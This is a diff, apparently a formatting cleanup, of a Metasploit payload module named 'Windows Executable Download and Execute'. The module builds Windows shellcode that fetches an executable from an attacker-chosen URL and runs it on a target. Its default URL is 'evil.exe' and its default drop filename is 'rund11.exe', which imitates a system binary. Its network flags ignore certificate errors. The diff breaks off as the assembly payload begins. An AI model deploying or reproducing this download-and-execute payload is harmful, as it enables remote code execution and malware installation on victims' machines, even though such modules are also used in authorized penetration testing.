@@ -4,71 +4,72 @@
 ##
 
 module MetasploitModule
-
   CachedSize = 429
 
   include Msf::Payload::Windows
   include Msf::Payload::Single
   include Msf::Payload::Windows::BlockApi
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Windows Executable Download (http,https,ftp) and Execute',
-      'Description'   => 'Download an EXE from an HTTP(S)/FTP URL and execute it',
-      'Author'        =>
-        [
+    super(
+      merge_info(
+        info,
+        'Name' => 'Windows Executable Download (http,https,ftp) and Execute',
+        'Description' => 'Download an EXE from an HTTP(S)/FTP URL and execute it',
+        'Author' => [
           'corelanc0d3r <peter.ve[at]corelan.be>'
         ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'win',
-      'Arch'          => ARCH_X86
-    ))
+        'License' => MSF_LICENSE,
+        'Platform' => 'win',
+        'Arch' => ARCH_X86
+      )
+    )
 
     # Register command execution options
     register_options(
       [
-        OptString.new('URL', [true, "The pre-encoded URL to the executable" ,"https://localhost:443/evil.exe"]),
-        OptString.new('EXE', [ true, "Filename to save & run executable on target system", "rund11.exe" ])
-      ])
+        OptString.new('URL', [true, 'The pre-encoded URL to the executable', 'https://localhost:443/evil.exe']),
+        OptString.new('EXE', [ true, 'Filename to save & run executable on target system', 'rund11.exe' ])
+      ]
+    )
   end
 
   #
   # Construct the payload
   #
   def generate(_opts = {})
-
-    target_uri = datastore['URL'] || ""
-    filename = datastore['EXE'] || ""
-    proto = "https"
+    target_uri = datastore['URL'] || ''
+    filename = datastore['EXE'] || ''
+    proto = 'https'
     dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
-      #;0x80000000 |        ; INTERNET_FLAG_RELOAD
-      #;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
-      #;0x00800000 |        ; INTERNET_FLAG_SECURE
-      #;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
-      #;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
-      #;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
-      #;0x00000200          ; INTERNET_FLAG_NO_UI"
+    # ;0x80000000 |        ; INTERNET_FLAG_RELOAD
+    # ;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
+    # ;0x00800000 |        ; INTERNET_FLAG_SECURE
+    # ;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
+    # ;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+    # ;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+    # ;0x00000200          ; INTERNET_FLAG_NO_UI"
 
     exitfuncs = {
-        "THREAD"  => Rex::Text.block_api_hash("kernel32.dll", "ExitThread").to_i(16), # ExitThread
-        "PROCESS" => Rex::Text.block_api_hash("kernel32.dll", "ExitProcess").to_i(16), # ExitProcess
-        "SEH"       => 0x00000000,	#we don't care
-        "NONE"      => 0x00000000	#we don't care
-        }
+      'THREAD' => Rex::Text.block_api_hash('kernel32.dll', 'ExitThread').to_i(16), # ExitThread
+      'PROCESS' => Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess').to_i(16), # ExitProcess
+      'SEH' => 0x00000000,	# we don't care
+      'NONE' => 0x00000000	# we don't care
+    }
 
     protoflags = {
-        "http"	=> 0x3,
-        "https"	=> 0x3,
-        "ftp"	=> 0x1
-        }
+      'http'	=> 0x3,
+      'https'	=> 0x3,
+      'ftp'	=> 0x1
+    }
 
     exitfunc = datastore['EXITFUNC'].upcase
 
     if exitfuncs[exitfunc]
       exitasm = case exitfunc
-        when "SEH" then "xor eax,eax\ncall eax"
-        when "NONE" then "jmp end"	# don't want to load user32.dll for GetLastError
-        else "push 0x0\npush 0x%x\ncall ebp" % exitfuncs[exitfunc]
-      end
+                when 'SEH' then "xor eax,eax\ncall eax"
+                when 'NONE' then 'jmp end'	# don't want to load user32.dll for GetLastError
+                else "push 0x0\npush 0x%x\ncall ebp" % exitfuncs[exitfunc]
+                end
     end
 
     # parse URL and break it down in
@@ -76,35 +77,35 @@ module MetasploitModule
     # - port
     # - /path/to/file
 
-    server_uri  = ''
+    server_uri = ''
     server_host = ''
-    port_nr     = 443	# default
+    port_nr = 443	# default
 
-    if target_uri.length > 0
+    if !target_uri.empty?
 
       # get desired protocol
       if target_uri =~ /^http:/
-        proto = "http"
+        proto = 'http'
         port_nr = 80
         dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
-          #;0x00400000 |        ; INTERNET_FLAG_KEEP_CONNECTION
+        # ;0x00400000 |        ; INTERNET_FLAG_KEEP_CONNECTION
       end
 
       if target_uri =~ /^ftp:/
-        proto = "ftp"
+        proto = 'ftp'
         port_nr = 21
         dwflags_asm = "push (0x80000000 | 0x04000000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags\n"
       end
 
       # sanitize the input
-      target_uri = target_uri.gsub('http://','')	#don't care about protocol
-      target_uri = target_uri.gsub('https://','')	#don't care about protocol
-      target_uri = target_uri.gsub('ftp://','')	#don't care about protocol
+      target_uri = target_uri.gsub('http://', '')	# don't care about protocol
+      target_uri = target_uri.gsub('https://', '')	# don't care about protocol
+      target_uri = target_uri.gsub('ftp://', '')	# don't care about protocol
 
-      server_info = target_uri.split("/")
+      server_info = target_uri.split('/')
 
       # did user specify a port ?
-      server_parts = server_info[0].split(":")
+      server_parts = server_info[0].split(':')
       if server_parts.length > 1
         port_nr = Integer(server_parts[1])
       end
@@ -114,8 +115,8 @@ module MetasploitModule
 
       # get /path/to/remote/exe
 
-      for i in (1..server_info.length-1)
-        server_uri << "/"
+      for i in (1..server_info.length - 1)
+        server_uri << '/'
         server_uri << server_info[i]
       end
 
@@ -123,8 +124,8 @@ module MetasploitModule
 
     # get protocol specific stuff
 
-    #create actual payload
-    payload_data = %Q^
+    # create actual payload
+    payload_data = %^
       cld
       call start
       #{asm_block_api}
